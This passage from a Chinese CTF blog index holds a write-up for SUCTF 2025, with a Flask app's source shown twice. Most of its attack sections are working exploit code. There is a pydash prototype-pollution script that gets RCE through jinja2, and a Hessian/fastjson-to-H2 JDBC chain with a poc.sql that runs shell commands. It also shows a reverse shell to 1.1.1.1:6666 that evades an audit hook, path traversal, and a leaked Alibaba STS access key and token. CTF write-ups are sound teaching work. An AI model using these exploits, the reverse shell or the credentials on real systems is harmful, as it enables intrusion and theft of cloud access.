redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 